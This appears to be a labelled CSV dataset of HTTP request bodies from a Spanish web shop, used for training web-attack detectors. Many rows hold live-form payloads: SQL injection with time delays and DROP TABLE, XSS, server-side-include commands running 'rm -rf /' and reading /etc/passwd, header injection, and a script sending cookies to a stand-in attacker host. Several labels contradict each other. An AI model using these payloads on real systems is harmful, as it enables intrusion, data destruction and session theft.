payload,attack_type,label
modo=registro&login=joaquin&password=desc9be35628&nombre=Diocles&apellidos=Canudes&email=clee3%40ac-activos.sr&dni=23599996H&direccion=Paseo+Pinos%2C+147+&ciudad=Adradas&cp=50200&provincia=Huelva&ntc=2545616018794952&B1=Registrar,normal,0
modo=registro&login=bienek&password=Bujer%EDa&nombre=Gianluca&apellidos=Gesto+Ball%E1n&email=halloran%40sanchezgordo.pa&dni=3B70B33381T&direccion=C%2F+Arco+De+Las+Orejas+76%2C+3%3FF&ciudad=Torrehermosa&cp=29494&provincia=Guadalajara&ntc=2829438543802993&B1=Registrar,cmdi,1
modo=entrar&login=joete&pwd=p7le3nt%2F5%2Flog6a&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=5632&B1=Confirmar,normal,0
B2=Vaciar+carrito123,normal,0
id=2,normal,0
B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=insertar&precio=5299&B1=Pasar+por+caja%2F,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
id=2%2F&nombre=Queso+Manchego&precio=85&cantidad=69&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=willison&password=a2ent9dora&nombre=Adelen&apellidos=Avell%ED&email=slaughter-worde%40juegois.ac&dni=93046182G&direccion=Senda+Fanaler*o%2C+%2B*198+1-B&ciudad=Figueruelas&cp=01220&provincia=Burgos&ntc=6349941758199278&B1=Registrar,cmdi,1
modo=insertar&precio=5031&b1=confirmar,normal,0
id=1&nombre=Ques%2Bo+Manchego&precio=39&cantidad=42&B1=A%F1adir+al+carrito,cmdi,1
errormsga=credenciales+incorrectas,normal,1
id=2,normal,0
modo=entrar&login=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&pwd=centilitro&remember=off&B1=Entrar123,xss,1
id=1&nombreA=Queso+Manchego&precio=39&cantidad=95&B1=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito,normal,0
modo=registro&login=mazanji&password=mag%fceto&nombre=fredesvinda&apellidos=matienzo+gallifa&email=lenhart8%40raullazaro.us&dni=46704601l&direccion=calle+juan+de+mena%2c+133+&ciudad=marines&cp=06460&provincia=girona&ntc=3945926912768707&b1=registrar,normal,0
modo=registro&login=falicov&password=desafinar&nombre=caleb&apellidos=hubach+larrumbe&email=ranez%40sandrasummer.bi&dni=98501968y&direccion=calle+rafael+bravo+gomez+179+5%3fh&ciudad=santa+marta+de+tormes&cp=44394&provincia=%c1vila&ntc=1091303634326853&b1=registrar,normal,0
modo=registro&login=penningt&password=BRUscatE&nombre=Teresilda&apellidos=Claverol+Lemunao&email=cadenat.mulich%404ghz.do&dni=69634281X&direccion=Alonso+De+Mendoza%2C+31+3B&ciudad=Villares+de+Soria%2C+Los&cp=44310&provincia=Girona&ntc=1657191621298298&B1=Registrar,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=95&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=schwenk&password=iNfINitIvO&nombre=Tarciano%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Varela+Pulido&email=strizhenova-boston%40hrmsl.kh&dni=36249511Q&direccion=Barrio+Vidal+132%2C+13%3FB&ciudad=Rubite&cp=50160&provincia=Zamora&ntc=6295032148467406&B1=Registrar,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=rossanes&password=elefa_n7ina&nombre=Emil&apellidos=Jaraba+Villa&email=henry%40sms24h.tr&dni=79274775P&direccion=C%2F+Ciudad+De+Sueca+S%2FN%2C+&ciudad=Alameda+de+Gard%F3n%2C+La&cp=47418&provincia=Burgos&ntc=4535499067699743&B1=Registrar,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=79&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=running&password=reconfortante&nombre=Ansaldo&apellidos=De+Jaime&email=lohr%40show.nom.ad&dni=12188295C&direccion=Plza.+Almudaina+S%2FN+&ciudad=G%E1tova&cp=46725&provincia=Barcelona&ntc=2389465046148028&B1=Registrar123,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
B2=Vaciar+carrito,normal,0
modo=registro&login=chaddie&password=t4ne0r84oso&nombre=Sel&apellidos=Ramells+Lam&email=handy.leleu%40chevrolet-volt.gob&dni=88215924E&direccion=Parque+Barranco+De+Coquin+67%2C+8%3FD&ciudad=Torres+de+Barbu%E9s&cp=45510&provincia=Salamanca&ntc=5060539995942562&B1=Registrar,normal,0
B2=Vaciar+carrito%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E123,sqli,1
modo=registro&login=gabrila&password=2r092ri06s6&nombre=Iverna&apellidos=Vilardaga+Bedmar&email=boxleitner-cremiewx%40novisa.tv&dni=59188627J&direccion=Calle+Alfredo+Blanco+25+&ciudad=Peleas+de+Abajo&cp=19278&provincia=Salamanca&ntc=1505484451430102&B1A=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
ida=2,normal,1
modo=insertar&precio=4358&B1=Pasar+por+caja123,normal,0
modo=entrar&login=kou-yuan&pwd=%2Bpul3a53ra&remember=on&B1A=Entrar,cmdi,1
modo=registro&login=humphrie&password=PELamEn&nombre=Caleb&apellidos=Manay+Crespo&email=terry%40mtos.ar&dni=73488403E&direccion=C%2F+Jara+9%2C+&ciudad=Campanario&cp=47320&provincia=Segovia&ntc=9267680844011077&B1=Registrar,normal,0
modo=registro&login=blumenfe&passwordA=jaq55l&nombre=Noelia&apellidos=Maquieira+San+Segundo&email=boucher%40paremoselalzheimer.at&dni=50781133P&direccion=Calle+Horticola+51+&ciudad=Campo+Lugar&cp=46443&provincia=Zamora&ntc=7191364141648176&B1=Registrar,cmdi,1
modo=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&precio=7097&B1=Confirmar123,xss,1
modo=registro&login=cubical&password=6itiHU4&nombre=Amada&apellidosA=Hidalgo+Bologna&email=blyth%40elsentidodelavida.sl&dni=23735828N&direccion=Clavijo+55%2C+&ciudad=Retuerta+del+Bullaque&cp=34469&provincia=Teruel&ntc=1890475688764912&B1=Registrar,cmdi,1
id=1%27INJECTED_PARAM,normal,1
modo=insertar&precio=2425&b1=confirmar,normal,0
B2A=Vaciar+carrito,normal,1
modo=insertar&precio=3313&B1=Confirmar,normal,0
id=3&nombre=vino+rioja&precio=100&cantidad=55&b1=a%f1adir+al+carrito,normal,0
modo=entrar&login=chamsi&pwd=Di7a%3Fg7R&remember=off&B1=Entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
idA=2,normal,1
id=1%252B123,normal,1
modo=registro&login=fallah&password=sindicable&nombre=Fabia&apellidos=Rom%E0+Subir%F3n&email=segar%40contactomujeres.nc&dni=A41950A1T&direccion=Ortiz+De+Zarate+32%2C+&ciudad=Petrer&cp=49331&provincia=Badajoz&ntc=5495554937258640&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=2258&B1=Confirmar,normal,0
modo=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=merlina&password=l12o3o&nombre=Heloisa&apellidos=Senini&email=odea-chua%40prestigecars.de&dni=51011537K&direccion=Passatge+Amerigo%2C+164%2C+&ciudad=Valdeltormo&cp=46175&provincia=Zamora&ntc=4467025067468073&B1=Registrar123,xss,1
modo=insertar&precio=676&B1=Confirmar,normal,0
errorMsg=%252B123,normal,1
errormsg=credenciales+incorrectas%27+and+%271%27%3d%271,normal,1
B2A=Vaciar+carrito,normal,1
modo=registro&login=robena1&password=improvisaci%F3n&nombre=Reinoldo&apellidos=Gelabert&email=oland5%40schnaps.com.by&dni=51756068L&direccion=C%2F+Santa+Escolastica+178%2C+&ciudadA=Quintanilla+de+Arriba&cp=35543&provincia=Huesca&ntc=7852557135021483&B1=Registrar,cmdi,1
errorMsg=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=insertar&precio=4110&B1=Pasar+por+caja%2F,cmdi,1
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
errormsg=credenciales+incorrectas,normal,0
b2=vaciar+carrito,normal,0
modo=insertar&precio=2158&B1=Pasar+por+caja%2F,cmdi,1
id=3&nombre=Queso+Manchego&precio=39&cantidad=96&B1=A%F1adir+al+carrito,normal,0
B2=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
modo=entrar&login=*shel*egey7&pwd=exp8a1%21a6a&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org123,xss,1
modo=insertar&precio=991&B1=Confirmar123,normal,0
B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,sqli,1
id=1&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=51&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=asia&pwd=67eSTAda&remember=on&B1=Entrar123,normal,0
modo=registro&login=herbers&password=melcocha&nombre=androlo&apellidos=mirambell+donet&email=furia%40gallegonicolas.bf&dni=48415614q&direccion=paseo+mokamer%2c+s%2fn%2c+&ciudad=hortig%fcela&cp=19312&provincia=valencia&ntc=3905556905973113&b1=registrar,normal,0
modo=registro&login=jessalyn&password=tra8ucaire&nombre=Ventura&apellidos=Codinacs+Bellver&email=nace%409horas.mg&dni=55526590J&direccion=C%2F+Zumalacarregui+4+11%3FH&ciudad=Ar%E9valo+de+la+Sierra&cp=40541&provinciaA=Segovia&ntc=2481775887753084&B1=Registrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=transki&pwd=4At4pL%E1n&remember=off&B1=Entrar,normal,0
modo=registro&login=hoggan2&password=diy%24AMBo&nombre=Waldemar&apellidos=Wesselhoft&email=watts%40viajesnacionales.na&dni=43925606E&direccion=Telletxe%2C+119%2C+&ciudad=Cadrete&cp=16630&provincia=Ja%E9n&ntc=0401288108131816&B1=Registrar123,normal,0
B2A=Vaciar+carrito,normal,1
id=1%27INJECTED_PARAM,normal,1
errorMsg=%252B,normal,1
id=2&nombre=Queso+Manchegosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=100&cantidad=88&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=yueping1&password=f9e2dora&nombreA=Harissa&apellidos=Aregall+Picabea&email=goorwitz-sejbalova%40hostingprofessional.com.jobs&dni=66204492G&direccion=Risue%F1o+141%2C+&ciudad=Font+d%27En+Carr%F2s%2C+la&cp=29551&provincia=Huelva&ntc=3999806738331009&B1=Registrar,cmdi,1
modo=registro&login=fulmer&password=amBaS&nombre=Sheila&apellidos=Mata+Hita&email=capers%40innovaris.fr&dni=96616229Z&direccion=Carrer+Panama%2C+27+8E&ciudad=Masroig%2C+El&cp=16813&provincia=Teruel&ntc=7137970068268248&B1=Registrar,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=25&B1=A%F1adir+al+carrito,normal,0
id=1,normal,0
modo=registro&login=wierzba&password=en62rm30a&nombre=Adelfo&apellidos=Mundaca+G%F3mez&email=ebersberg%4023horas.kp&dni=78942434V%27INJECTED_PARAM&direccion=Periodista+Jose+Fernandez+Martinez%2C+156+5%3FB&ciudad=Navaconcejo&cp=44592&provincia=Madrid&ntc=0883153406920438&B1=Registrar,cmdi,1
MODO=REGISTRO&LOGIN=MITSUIPAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&PASSWORD=D2s3o1NIL2AR&NOMBRE=tEA&APELLIDOS=cABRERA+nOGUERA&EMAIL=HOLZER-HAMMERSLEY4%40DISCON.IN&DNI=21034297s&DIRECCION=gUADAMACIL%2c+198%2c+&CIUDAD=tORREJONCILLO&CP=08779&PROVINCIA=tERUEL&NTC=4706372444418662&b1=rEGISTRAR,xss,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=93&B1=A%F1adir+al+carrito,normal,0
modoA=insertar&precio=5565&B1=Confirmar,cmdi,1
modo=registro&login=vehling&password=cargadas&nombre=Rodipo&apellidos=Peteiro&email=szmidt%40surcosur.id&dni=64709043S&direccion=Calle+Ourense+119+5%3FF&ciudad=Puerto+Real&cp=2632A&provincia=Guadalajara&ntc=0132612345545070&B1=Registrar,cmdi,1
modo=entrar&login=donovan&pwd=bardAnA&remember=on&B1=Entrar,normal,0
modo=registro&login=reis&password=-fiSiol%F3gicamente&nombre=Marcolina&apellidos=Marcos+Esculta&email=boyar-decamp%40barnizultravioleta.as&dni=97729684Q&direccion=Blasco+De+Garay%2C+168%2C+&ciudad=Escurial+de+la+Sierra&cp=03600&provincia=La+Rioja&ntc=0731466925802277&B1=Registrar,normal,0
modo=insertar&precio=8792&B1=Pasar+por+cajaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,cmdi,1
b2=vaciar+carrito,normal,0
id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
modo=registro&login=brittan&password=al9mb%2B532&nombre=Onila&apellidos=Furcat+Zarco&email=greiff%40opticaweb.bu&dniA=36455660Q&direccion=Calle+Nueve+57+&ciudad=Utiel&cp=01899&provincia=Madrid&ntc=0088492463086794&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
modo=entrar&login=bly7&pwd=revesa&remember=on&B1=Entrar,normal,0
modo=registro&login=gail&password=1oca&nombre=Reginald&apellidos=Conocchiari+Zagal&email=lacey%40bwds.mp&dni=07819871D&direccion=Camino+Viejo%2C+2%2C+&ciudad=Bellreguard&cp=18100&provincia=Guadalajara&ntc=8173502713249650&B1=Registrar123,normal,0
B2=%257C123,normal,1
id=1&nombre=Vino+Rioja&precio=85&cantidad=68&B1=A%F1adir+al+carrito123,normal,0
ERRORmSG=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=babbage&password=Lej%EDSimoS%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar123,sqli,1
MODO=REGISTRO&LOGIN=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PASSWORD=SE8I06C9L&NOMBRE=vALIENTE&APELLIDOS=yOMONA+nODA&EMAIL=OBERON%4023HORAS.KZ&DNI=73353905m&DIRECCION=cALLE+aSSALT%2c+120+&CIUDAD=aZNALC%e1ZAR&CP=49120&PROVINCIA=bURGOS&NTC=6920842539231486&b1=rEGISTRAR,sqli,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&cantidad=7&B1=A%F1adir+al+carrito123,xss,1
B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,sqli,1
MODO=REGISTRO&LOGIN=LEADER&PASSWORD=EMbEBED.oRa&NOMBRE=eMMANUELLE&APELLIDOS=fISCHER+gOROSTIZA&EMAIL=BERY%40BLANQUILLOS.BU&DNI=80643702k&DIRECCION=cAMPING+tORRECARDENAS%2c+168+%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&CIUDAD=hONRUBIA+DE+LA+cUESTA&CP=19244&PROVINCIA=aLMER%edA&NTC=0037825357967429&b1=rEGISTRAR,sqli,1
modo=registro&login=herminia&password=5e938rera&nombre=Isalenia&apellidos=Ostapovich+Furnari&email=holloway_brandenburg%40bijoubijoudiferente.hu&dni=74799380E&direccion=Pl.+Poeta+Badenes%2C+48%2C+11-C&ciudad=Navas+de+San+Juan&cp=49240&provincia=Murcia&ntc=4650446572677289&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=2%27+DELETE+FROM+USERS,normal,1
modo=registro&login=hoehn&password=6ESTIla%24tORiO&nombre=Mahonri&apellidos=Cunat+Amenta&email=roco%40forohh.ge&dni=69346006V&direccion=Plaza+Luis+Pombo%2C+S%2FN+9%3FG&ciudad=Baix+Pallars&cp=43761&provincia=Lleida&ntc=9176775896982100&B1=Registrar,normal,0
modo=registro&login=rudich&password=gilito&nombre=Manlio&apellidos=Piedra+Obrador&email=errol%40dise%F1odesoftware.ml&dni=03770036Z&direccion=Llobregat+130%2C+&ciudad=Pe%F1arroya-Pueblonuevo&cp=37130&provincia=Barcelona&ntc=8515880791800894&B1=Registrar,normal,0
modo=registro&login=lap&password=ramblizo&nombre=beda&apellidos=moch%f3n+quer&email=whipp%40esmeraldas.org.tm&dni=42287106l&direccion=calle+beato+tomas+de+zumarraga%2c+89+12-c&ciudad=laspu%f1a&cp=28811&provincia=soria&ntc=8043015940180984&b1=registrar,normal,0
B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=lanae&password=4e6qu5r5r&nombre=Maitena&apellidos=Urrupa%EDn+Moger&email=teulinks-oakman%40941.tr&dni=33814848H&direccion=Nu%F1ez+De+Balboa+131+2-F&ciudad=Belinch%F3n&cp=09515&provincia=Alicante&ntc=0131468635735450&B1=Registrar,normal,0
modo=registro&login=fallah&password=sindicable&nombre=Fabia&apellidos=Rom%E0+Subir%F3n&email=segar%40contactomujeres.nc&dni=64964263G&direccion=Ortiz+De+Zarate+32%2C+&ciudad=Petrer&cp=49331&provincia=Badajoz&ntc=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Registrar,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=78&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=tenna1&password=l0CiaNeSco&nombre=Pascacio&apellidos=Campillo&email=dionisio%40bijoubijoudiferente.tv&dni=43888363Q&direccion=C%2F+Fontanelles%2C+196%2C+&ciudad=Golpejas&cp=19196&provincia=Asturias&ntc=6862303368797459&B1=Registrar,normal,0
modo=registro&login=hurtado9&password=0r90Di89R&nombre=Ivette&apellidos=Alan+Sellar%E9s&email=bryant%40wave.com.mw&dni=40574017Q&direccion=Pla%E7a+Verdum+144%2C+&ciudad=Puntallana&cp=03827&provincia=Burgos&ntc=6256619473933426&B1=Registrar,normal,0
idA=2,normal,1
id=1&nombre=Vino+Rioja&precio=100&cantidadA=53&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=74&b1=a%f1adir+al+carrito,normal,0
B2=Vaciar+carrito123,normal,0
id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
modo=registro&login=yung-fu&password=8Ach35&nombre=Atico&apellidos=Farzati+Bol%E0s&email=gobert%40olvidalo.sh&dni=87238782N&direccion=Calle+Salamanca%2C+147%2C+12-C&ciudad=Llacuna%2C+La&cp=42192&provinciaA=La+Rioja&ntc=6202220690818816&B1=Registrar,cmdi,1
modo=registro&login=quan&password=L71o7O6%CDNe4&nombre=Herm%E1nn&apellidos=Estaragu%E9+Cort%E9s&email=girls%40viscotek.mh&dni=62336583M&direccion=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ciudad=Aras&cp=37727&provincia=Granada&ntc=3043074301340407&B1=Registrar,xss,1
id=1&nombre=queso+manchego&precio=85&cantidad=49&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=roge%3Frio&password=91pol277e30&nombre=Emanuel&apellidos=Barriuso+Arvizu&email=ecoffey%40hostrofessional.com.dd&dni=05207916A&direccion=Ciudad+De+Ceuta%2C+31%2C+9-B&ciudad=Salda%F1a&cp=08501&provincia=C%E1ceres&ntc=9078165703256769&B1=Registrar,cmdi,1
B2A=Vaciar+carrito123,normal,1
id=1,normal,0
modo=insertar&precio=2579&B1A=Confirmar,cmdi,1
modo=registro&login=clarita&password=2e720lOn7r%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccion=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Santa+Eulalia+Bajera&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar,sqli,1
id=2&nombre=Queso+Manchego&precio=39&cantidad=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=halsyany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=engarbado&remember=off&B1=Entrar,cmdi,1
modo=entrar&login=renem%2Fa&pwd=v%E1L70am4390&remember=on&B1=Entrar,cmdi,1
modo=registro&login=rosita&password=4i7sp375&nombre=shannen&apellidos=guaita+zaragoza&email=philips%40davidymamen.sa&dni=42231079c&direccion=fuenmayor%2c+130%2c+&ciudad=lantar%f3n&cp=05164&provincia=huesca&ntc=2106115502546760&b1=registrar,normal,0
B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
idA=2123,normal,1
errorMsg=Credenciales+incorrectas123,normal,0
errormsg=credenciales+incorrectas,normal,0
errormsg=credenciales+incorrectas,normal,0
id=1,normal,0
modo=insertar&precio=5337&B1=Pasar+por+caja,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=58&B1=A%F1adir+al+carrito,normal,0
B2=Vaciar+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,xss,1
modo=entrar&login=wilken&pwd=r5pa2el0s&remember=off%2F&B1=Entrar,cmdi,1
modo=registro&login=maher&password=ca922839alo&nombre=Indira&apellidos=Lude%F1as+Lopez&email=hessling%40mundoapple.kw&dni=67332763X&direccion=C%2F+Sagrado+Corazon+26+5E&ciudad=Arroyomolinos&cp=15076&provincia=Navarra&ntcA=8289412195885989&B1=Registrar,cmdi,1
modo=registro&login=benjavan&password=MaNtateri.lla&nombre=Barcario&apellidos=Estades+Orizales&email=shaughnessy%40white-pearl-resort.nf&dni=53933880F&direccion=o+Rio%2C+134%2C+&ciudad=Elorrio&cp=02247&provincia=Navarra&ntc=1022652655889356&B1=Registrar,normal,0
B2A=Vaciar+carrito,normal,1
modo=registro&login=tristan&password=5sp0luz64m3ent8&nombre=Wara&apellidos=De+la+Horra+Arzaluz&email=colodner%40proofreader.sj&dni=99508422A&direccion=Avenida+Letanias+195+2%3FD&ciudad=Algemes%ED&cp=09267&provincia=Castell%F3n&ntc=6753518387589503&B1=Registrar,normal,0
modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,cmdi,1
modo=registro&login=fikis8&password=apret%F3n&nombre=Crisp%EDn&apellidos=Legarreta+Sant&email=carlo_salcedo4%40nomao.wf&dni=42520233H&direccion=Calle+Sant+Erasme%2C+81+&ciudad=Enc%EDo&cp=37217&provincia=Burgos&ntc=0184493259280421&B1=Registrar123,normal,0
modo=entrar&login=tele&pwd=su7in1st9ar&remember=off&B1=Entrar,normal,0
modo=entrar&login=singyu&pwd=e88r6ber%EDa&remember=off&B1=Entrar,normal,0
MODO=ENTRAR&LOGIN=NESS&PWD=EXCUsaDOR&REMEMBER=OFFPAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&b1=eNTRAR,xss,1
modo=entrar&login=maroucho&pwd=d119a&remember=on&B1=Entrar,normal,0
id=2&nombre=vino+rioja&precio=100&cantidad=75&b1=a%f1adir+al+carrito,normal,0
modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=nezm&pwd=1Eb5l0e&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=1729&b1=pasar+por+caja,normal,0
modo=entrar&login=riccitel&pwd=aprisCar&remember=%257C&B1=Entrar,cmdi,1
modo=entrar&login=meenaksh&pwd=2a8um238638&remember=on&B1=Entrar,normal,0
modo=entrar&login=bossa&pwd=ad8ma45ino&remember=off&B1=Entrar123,normal,0
errorMsg=Credenciales+incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
modo=insertar&precioA=9857&B1=Pasar+por+caja,cmdi,1
modo=registro&login=rygwalsk&password=ve50able&nombre=Francisco&apellidos=Pallares+Milara&email=gozzi%40encuentrodominios.at&dni=51556666G&direccion=Pl.+Banco+196%2C+7G&ciudad=Corrales&cp=03187&provincia=%3FT.ole%2Fdo&ntc=3169451354292215&B1=Registrar,cmdi,1
modo=registro&login=dougall&password=bisonte&nombre=Olalia&apellidos=Molas+Madan&email=landesman%40cohel.mw&dni=95690740E&direccion=Sargento+Luna%2C+184+&ciudad=Villagalijo&cp=22571&provincia=Girona&ntc=9687551942893066&B1=Registrar,normal,0
modo=registro&login=chatchai&password=chismorrear&nombre=Rachid&apellidos=Mingo+Elbaile&email=schkorski%40elxxi.zr&dni=B07423903D&direccion=Paraguay%2C+88%2C+5%3FE&ciudad=Aulesti&cp=31754&provincia=La+Rioja&ntc=2647099047093404&B1=Registrar,cmdi,1
